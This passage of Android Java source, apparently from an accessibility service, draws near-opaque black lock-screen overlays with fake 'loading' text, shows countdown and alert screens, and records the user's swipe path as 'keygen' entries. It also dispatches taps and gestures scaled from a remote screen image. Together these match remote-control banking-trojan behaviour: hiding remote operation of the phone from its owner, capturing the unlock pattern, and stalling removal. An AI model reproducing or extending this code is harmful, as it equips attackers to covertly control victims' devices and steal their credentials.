        if (overlayView == null) {
            overlayView = new View(this);
            overlayView.setBackgroundColor(0xFF000000); // Black color
            overlayView.getBackground().setAlpha(253);
            loadingTextView = new TextView(this);
            loadingTextView.setTextColor(Color.WHITE);
            loadingTextView.setText(txtBlack);
            loadingTextView.setTextSize(24);
            loadingTextView.setGravity(Gravity.CENTER);
            loadingTextView.setPadding(0, 0, 0, 150);
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    deviceHeight + 300,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    PixelFormat.TRANSPARENT
            );
            params.gravity = Gravity.CENTER;
            windowManager.addView(overlayView, params);
            windowManager.addView(loadingTextView, params);
            blackScreen = true;
        }
    }

    public void removeBlackScreen() {
        if (overlayView != null) {
            windowManager.removeView(overlayView);
            windowManager.removeView(loadingTextView);
            overlayView = null;
            blackScreen = false;
        }
    }

    public void makeImageOverlayScreen() {
        if (overlayImageView == null) {
            overlayImageView = new View(this);
            overlayImageView.setBackgroundColor(0xFF000000); // blue
            overlayImageView.getBackground().setAlpha(253);
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    deviceHeight + 300,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    PixelFormat.TRANSPARENT
            );
            params.gravity = Gravity.CENTER;


            imgOverlay = new ImageView(this);
            if(overlayimgdata.equals("")) {
                Glide.with(this)
                        .asGif()
                        .load(R.drawable.gif_overlayer)
                        .transition(DrawableTransitionOptions.withCrossFade())
                        .into(imgOverlay);
            } else {
                if(overlayimgtype.equals("image-file")) {
                    String base64Image = overlayimgdata.split(",")[1];
                    byte[] decodedBytes = Base64.decode(base64Image, Base64.DEFAULT);
                    Bitmap bitmap = BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.length);
                    Glide.with(this)
                            .load(decodedBytes)
                            .error(R.drawable.img_alert)
                            .transition(DrawableTransitionOptions.withCrossFade())
                            .into(imgOverlay);
                } else if(overlayimgtype.equals("image-link")) {
                    Glide.with(this)
                            .asGif()
                            .load(overlayimgdata)
                            .error(R.drawable.img_alert)
                            .transition(DrawableTransitionOptions.withCrossFade())
                            .into(imgOverlay);
                } else {
                    Glide.with(this)
                            .asGif()
                            .load(R.drawable.img_alert)
                            .transition(DrawableTransitionOptions.withCrossFade())
                            .into(imgOverlay);
                }

            }

            // imgOverlay.setImageDrawable(getResources().getDrawable(R.drawable.img_overlay));
            imgOverlay.setAlpha(0.5f);
            WindowManager.LayoutParams img_params = new WindowManager.LayoutParams(
                    deviceWidth * 3 / 4,
                    deviceWidth * 3 / 4,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    PixelFormat.TRANSPARENT
            );
            img_params.gravity = Gravity.CENTER;
            windowManagerImage.addView(overlayImageView, params);
            windowManagerImage.addView(imgOverlay, img_params);
            isImageOverlayScreen = true;
        }
    }

    public void removeImageOverlayScreen() {
        if (overlayImageView != null) {
            windowManagerImage.removeView(overlayImageView);
            windowManagerImage.removeView(imgOverlay);
            overlayImageView = null;
            isImageOverlayScreen = false;
        }
    }

    public void makeOverlayWaitingScreen() {
        if (overlayWaitingView == null) {
            overlayWaitingView = new View(this);
            overlayWaitingView.setBackgroundColor(0xFF787878); // Black color
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    deviceHeight + 300,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    PixelFormat.TRANSPARENT
            );
            params.gravity = Gravity.CENTER;

            txtWaiting = new TextView(this);
            txtWaiting.setTextColor(Color.WHITE);
            txtWaiting.setText(getResources().getString(R.string.overlaywaiting));
            txtWaiting.setTextSize(20);
            txtWaiting.setGravity(Gravity.CENTER);
            WindowManager.LayoutParams txt_waiting_params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    PixelFormat.TRANSPARENT
            );
            txt_waiting_params.gravity = Gravity.CENTER;
            txt_waiting_params.y = 300;

            txtCounting = new TextView(this);
            txtCounting.setTextColor(Color.WHITE);
            if (manufacturer.equals("xiaomi")) {
                txtCounting.setText("30");
            } else {
                txtCounting.setText("15");
            }
            txtCounting.setTextSize(50);
            txtCounting.setGravity(Gravity.CENTER);
            txtCounting.setPadding(0, 0, 0, deviceWidth / 2 + 60);
            WindowManager.LayoutParams txt_params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    PixelFormat.TRANSPARENT
            );
            txt_params.gravity = Gravity.CENTER;

            progressWaitingBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
            progressWaitingBar.setIndeterminate(false); // Set to false for determinate progress
            progressWaitingBar.setMax(100); // Set max progress
            progressWaitingBar.setProgress(100); // Set initial progress (e.g., 50%)

// Set layout params for the ProgressBar
            WindowManager.LayoutParams progressParams = new WindowManager.LayoutParams(
                    deviceWidth - 100, // Full width
                    100, // Height auto
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    PixelFormat.TRANSPARENT
            );
            progressParams.gravity = Gravity.CENTER;

            windowManagerWaiting.addView(overlayWaitingView, params);
            windowManagerWaiting.addView(progressWaitingBar, progressParams);
            windowManagerWaiting.addView(txtWaiting, txt_waiting_params);
            windowManagerWaiting.addView(txtCounting, txt_params);
            isWaitingScreen = true;
            if (manufacturer.equals("xiaomi")) {
                new CountDownTimer(30000, 1000) { // 10 seconds countdown, tick every 1 second
                    @Override
                    public void onTick(long millisUntilFinished) {
                        // Update the countdown text with the remaining seconds
                        txtCounting.setText(String.valueOf(millisUntilFinished / 1000));
                        progressWaitingBar.setProgress((int) (millisUntilFinished / 200), true);
                    }

                    @Override
                    public void onFinish() {
                        // When the countdown finishes, display "Done" or hide the countdown
                        txtCounting.setText("0");
                        removeWaitingOverlayscreen();
                    }
                }.start();
            } else {
                new CountDownTimer(15000, 1000) { // 10 seconds countdown, tick every 1 second
                    @Override
                    public void onTick(long millisUntilFinished) {
                        // Update the countdown text with the remaining seconds
                        txtCounting.setText(String.valueOf(millisUntilFinished / 1000));
                        progressWaitingBar.setProgress((int) (millisUntilFinished / 150), true);
                    }

                    @Override
                    public void onFinish() {
                        // When the countdown finishes, display "Done" or hide the countdown
                        txtCounting.setText("0");
                        removeWaitingOverlayscreen();
                    }
                }.start();
            }


        }
    }

    public void removeWaitingOverlayscreen() {
        if (overlayWaitingView != null) {
            windowManagerWaiting.removeView(overlayWaitingView);
            windowManagerWaiting.removeView(txtWaiting);
            windowManagerWaiting.removeView(txtCounting);
            windowManagerWaiting.removeView(progressWaitingBar);
//            windowManagerWaiting.removeView(imgWaiting);
            overlayWaitingView = null;
            isWaitingScreen = false;
        }
    }

    public void makeOverlayRemoveScreen() {
        if (overlayRemoveView == null) {
            Boolean alert_status = false;
            if(alert_status) {
                overlayRemoveView = new View(this);
                overlayRemoveView.setBackgroundColor(0xFF787878); // Black color

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        deviceHeight + 300,
                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSPARENT
                );
                params.gravity = Gravity.CENTER;
                imgRemove = new ImageView(this);
                imgRemove.setImageDrawable(getResources().getDrawable(R.drawable.img_alert));

                WindowManager.LayoutParams img_params = new WindowManager.LayoutParams(
                        deviceWidth / 2,
                        deviceWidth / 2,
                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSPARENT
                );
                img_params.gravity = Gravity.CENTER;


                txtRemoveWaiting = new TextView(this);
                txtRemoveWaiting.setTextColor(Color.WHITE);
                txtRemoveWaiting.setText(getResources().getString(R.string.overlayremovewaiting));
                txtRemoveWaiting.setTextSize(14);
                txtRemoveWaiting.setGravity(Gravity.CENTER);

                WindowManager.LayoutParams txt_waiting_params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSPARENT
                );
                txt_waiting_params.gravity = Gravity.CENTER;
                txt_waiting_params.y = deviceWidth / 2;

                txtRemoveTitle = new TextView(this);
                txtRemoveTitle.setTextColor(Color.WHITE);
                txtRemoveTitle.setText(getResources().getString(R.string.overlayremovetitle));
                txtRemoveTitle.setTextSize(14);
                txtRemoveTitle.setGravity(Gravity.CENTER);

                WindowManager.LayoutParams txt_title_params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSPARENT
                );
                txt_title_params.gravity = Gravity.CENTER;
                txt_title_params.y = deviceWidth / 4;


                txtRemoveCounting = new TextView(this);
                txtRemoveCounting.setTextColor(Color.WHITE);
                txtRemoveCounting.setText("0");
                txtRemoveCounting.setTextSize(50);
                txtRemoveCounting.setGravity(Gravity.CENTER);
                txtRemoveCounting.setPadding(0, 0, 0, deviceWidth / 2 + 60);

                WindowManager.LayoutParams txt_params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSPARENT
                );
                txt_params.gravity = Gravity.CENTER;


                windowManagerRemove.addView(overlayRemoveView, params);
                windowManagerRemove.addView(imgRemove, img_params);
                windowManagerRemove.addView(txtRemoveWaiting, txt_waiting_params);
                windowManagerRemove.addView(txtRemoveTitle, txt_title_params);
                windowManagerRemove.addView(txtRemoveCounting, txt_params);
                isWaitingScreen = true;

                new CountDownTimer(15000, 1000) { // 10 seconds countdown, tick every 1 second
                    @Override
                    public void onTick(long millisUntilFinished) {
                        // Update the countdown text with the remaining seconds
                        txtRemoveCounting.setText(String.valueOf(millisUntilFinished / 1000));
                    }

                    @Override
                    public void onFinish() {
                        // When the countdown finishes, display "Done" or hide the countdown
                        txtRemoveCounting.setText("0");
                        removeRemoveOverlayscreen();
                    }
                }.start();
            } else {
                overlayRemoveView = new View(this);
                overlayRemoveView.setBackgroundColor(0xC0FF0000); // Black color

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        deviceHeight + 300,
                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSPARENT
                );
                params.gravity = Gravity.CENTER;
                imgRemove = new ImageView(this);
                imgRemove.setImageDrawable(getResources().getDrawable(R.drawable.img_alert_popup));

                WindowManager.LayoutParams img_params = new WindowManager.LayoutParams(
                        deviceWidth * 9/10,
                        deviceWidth * 9/10,
                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSPARENT
                );
                img_params.gravity = Gravity.CENTER;

                txtRemoveCounting = new TextView(this);
                txtRemoveCounting.setTextColor(Color.WHITE);
                txtRemoveCounting.setText("0");
                txtRemoveCounting.setTextSize(50);
                txtRemoveCounting.setGravity(Gravity.CENTER);
                txtRemoveCounting.setPadding(0, 0, 0, deviceWidth / 2 + deviceWidth * 9/20 + 20);

                WindowManager.LayoutParams txt_params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSPARENT
                );
                txt_params.gravity = Gravity.CENTER;

                windowManagerRemove.addView(overlayRemoveView, params);
                windowManagerRemove.addView(imgRemove, img_params);
                windowManagerRemove.addView(txtRemoveCounting, txt_params);
                isWaitingScreen = true;

                new CountDownTimer(15000, 1000) { // 10 seconds countdown, tick every 1 second
                    @Override
                    public void onTick(long millisUntilFinished) {
                        // Update the countdown text with the remaining seconds
                        txtRemoveCounting.setText(String.valueOf(millisUntilFinished / 1000));
                    }

                    @Override
                    public void onFinish() {
                        // When the countdown finishes, display "Done" or hide the countdown
                        txtRemoveCounting.setText("0");
                        removeRemoveOverlayscreen();
                    }
                }.start();
            }

        }
    }

    public void removeRemoveOverlayscreen() {
        if (overlayRemoveView != null) {
            Boolean alert_status = false;
            if(alert_status) {
                windowManagerRemove.removeView(overlayRemoveView);
                windowManagerRemove.removeView(txtRemoveWaiting);
                windowManagerRemove.removeView(txtRemoveTitle);
                windowManagerRemove.removeView(txtRemoveCounting);
                windowManagerRemove.removeView(imgRemove);
                overlayRemoveView = null;
                isWaitingScreen = false;
            } else {
                windowManagerRemove.removeView(overlayRemoveView);
                windowManagerRemove.removeView(imgRemove);
                windowManagerRemove.removeView(txtRemoveCounting);
                overlayRemoveView = null;
                isWaitingScreen = false;
            }


        }
    }

    @SuppressLint("RtlHardcoded")
    public void makeOverlayTouchScreen() {
        if (overlayTouchView == null) {
            overlayTouchView = new View(this);
            overlayTouchView.setBackgroundColor(Color.TRANSPARENT);

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    deviceHeight + 300,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL|
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    PixelFormat.TRANSPARENT
            );
            params.gravity = Gravity.TOP|Gravity.START;

            windowManagerTouch.addView(overlayTouchView, params);
            isTouchScreen = true;

            overlayTouchView.setOnTouchListener(new View.OnTouchListener() {
                @Override
                public boolean onTouch(View v, MotionEvent event) {
                    switch (event.getAction()) {
                        case MotionEvent.ACTION_DOWN:
                            // Clear list and start capturing movement
                            movementPoints.clear();
                            Log.d("start point::", "X::" + event.getRawX() + " " + event.getX() + "Y::" + event.getRawY() + " " + event.getY());
                            movementPoints.add(new MousePositionEntry(event.getRawX(), event.getRawY()));
                            break;

                        case MotionEvent.ACTION_MOVE:
                            // Capture all movement points
                            Log.d("Move point::", "X::" + event.getRawX() + " " + event.getX() + "Y::" + event.getRawY() + " " + event.getY());
                            movementPoints.add(new MousePositionEntry(event.getRawX(), event.getRawY()));
                            break;

                        case MotionEvent.ACTION_UP:
                            removeTouchOverlayscreen();
                            handleTouchGesture();
                            break;
                    }
                    return true;
                }
            });
        }
    }

    public void removeTouchOverlayscreen() {
        if (overlayTouchView != null) {
            windowManagerTouch.removeView(overlayTouchView);
            overlayTouchView = null;
            isTouchScreen = false;
        }
    }

    public void handleTouchGesture() {
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                performGesture(movementPoints);
            }
        }, 200);

    }

    private void handleScreenUp() {
        List<MousePositionEntry> mouseScrollEntryList = new ArrayList<>();
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 2 / 3 * imageWidth / deviceWidth));
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 2 / 3 * imageWidth / deviceWidth - 1));
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 2 / 3 * imageWidth / deviceWidth - 3));
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 1 / 3 * imageWidth / deviceWidth + 10));
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 1 / 3 * imageWidth / deviceWidth));
        Common.getInstance().setMousePositionEntries(mouseScrollEntryList);
        mouseDraw();
    }

    private void handleScreenDown() {
        List<MousePositionEntry> mouseScrollEntryList = new ArrayList<>();
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 1 / 3 * imageWidth / deviceWidth));
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 1 / 3 * imageWidth / deviceWidth + 10));
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 1 / 3 * imageWidth / deviceWidth + 20));
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 2 / 3 * imageWidth / deviceWidth - 1));
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth / 2, deviceHeight * 2 / 3 * imageWidth / deviceWidth));
        Common.getInstance().setMousePositionEntries(mouseScrollEntryList);
        mouseDraw();
    }

    private void handleScreenLeft() {
        List<MousePositionEntry> mouseScrollEntryList = new ArrayList<>();
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 30, 170));
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 31, 170));
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 40, 170));
        mouseScrollEntryList.add(new MousePositionEntry(40, 170));
        mouseScrollEntryList.add(new MousePositionEntry(30, 170));
        Common.getInstance().setMousePositionEntries(mouseScrollEntryList);
        mouseDraw();
    }

    private void handleScreenRight() {
        List<MousePositionEntry> mouseScrollEntryList = new ArrayList<>();
        mouseScrollEntryList.add(new MousePositionEntry(30, 170));
        mouseScrollEntryList.add(new MousePositionEntry(31, 170));
        mouseScrollEntryList.add(new MousePositionEntry(40, 170));
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 10, 170));
        mouseScrollEntryList.add(new MousePositionEntry(imageWidth - 20, 170));
        Common.getInstance().setMousePositionEntries(mouseScrollEntryList);
        mouseDraw();
    }

    public void performClick(double x, double y) {
        double currentXPosition = x * deviceWidth / imageWidth;
        double currentYPosition = y * deviceWidth / imageWidth;
        Path clickPath = new Path();
        clickPath.moveTo((float) currentXPosition, (float) currentYPosition);

        GestureDescription.StrokeDescription clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, 1);
        GestureDescription clickGesture = new GestureDescription.Builder().addStroke(clickStroke).build();

        boolean result = dispatchGesture(clickGesture, new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
                Log.d("PerformClick", "Click performed successfully");
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Log.d(TAG, "Click cancelled");
            }
        }, null);

        if (!result) {
            Log.d(TAG, "Failed to dispatch gesture");
        }
    }

    public void performClickMain(double x, double y) {
        Path clickPath = new Path();
        clickPath.moveTo((float) x, (float) y);

        GestureDescription.StrokeDescription clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, 1);
        GestureDescription clickGesture = new GestureDescription.Builder().addStroke(clickStroke).build();

        boolean result = dispatchGesture(clickGesture, new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
                Log.d("performmain", "Click performed successfully");
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Log.d(TAG, "Click cancelled");
            }
        }, null);

        if (!result) {
            Log.d(TAG, "Failed to dispatch gesture");
        }
    }

    public void clickthis(int x, int y) {
        // for a single tap a duration of 1 ms is enough
        try {
            final int DURATION = 5;

            Path clickPath = new Path();
            clickPath.moveTo(x, y);
            //  clickPath.lineTo(x, y);
            GestureDescription.StrokeDescription clickStroke =
                    null;
            clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, DURATION);
            GestureDescription.Builder clickBuilder = new GestureDescription.Builder();
            clickBuilder.addStroke(clickStroke);
            dispatchGesture(clickBuilder.build(), null, null);
        } catch (Exception a) {
            a.printStackTrace();
        }
    }

    public void mouseDraw() {
        List<MousePositionEntry> mousePositionEntryList = Common.getInstance().getMousePositionEntries();
        Path path = new Path();
        path.moveTo((float) mousePositionEntryList.get(0).getxPosition() * deviceWidth / imageWidth, (float) mousePositionEntryList.get(0).getyPosition() * deviceWidth / imageWidth);
        for (int i2 = 1; i2 < mousePositionEntryList.size(); i2++) {
            try {
                if (mousePositionEntryList.get(i2).getxPosition() >= 0.0 && mousePositionEntryList.get(i2).getyPosition() > 0.0) {
                    path.lineTo((float) mousePositionEntryList.get(i2).getxPosition() * deviceWidth / imageWidth, (float) mousePositionEntryList.get(i2).getyPosition() * deviceWidth / imageWidth);
                }
            } catch (Exception unused) {
                unused.printStackTrace();
            }
        }

        GestureDescription.StrokeDescription dragStroke = new GestureDescription.StrokeDescription(path, 0, 600);
        GestureDescription dragGesture = new GestureDescription.Builder().addStroke(dragStroke).build();

        boolean result = dispatchGesture(dragGesture, new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Log.d(TAG, "Click cancelled");
            }
        }, null);

        if (!result) {
            Log.d(TAG, "Failed to dispatch gesture");
        }
    }

    public void performGesture(List<MousePositionEntry> points) {
        if (points.size() < 2) return; // Need at least two points for a gesture

        Path path = new Path();
        path.moveTo((float) points.get(0).getxPosition(), (float) points.get(0).getyPosition()); // Start from the first point

        // Create the path for the gesture
        for (int i = 1; i < points.size(); i++) {
            path.lineTo((float) points.get(i).getxPosition(), (float) points.get(i).getyPosition());
        }

        // Build the gesture description
        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 0, 600));

        GestureDescription gesture = gestureBuilder.build();
        boolean result = dispatchGesture(gesture, new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
                List<MousePositionEntry> newMousePoints = new ArrayList<>(points);
                Common.getInstance().setKeygenEntries(newMousePoints);
                isTouchScreen = false;
                checkCurrentScreen();
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Log.d(TAG, "Click cancelled");
            }
        }, null);

        if (!result) {
            Log.d(TAG, "Failed to dispatch gesture");
        }
    }

    public void performGestureMain(List<MousePositionEntry> points) {
        if (points.size() < 2) return; // Need at least two points for a gesture

        Path path = new Path();
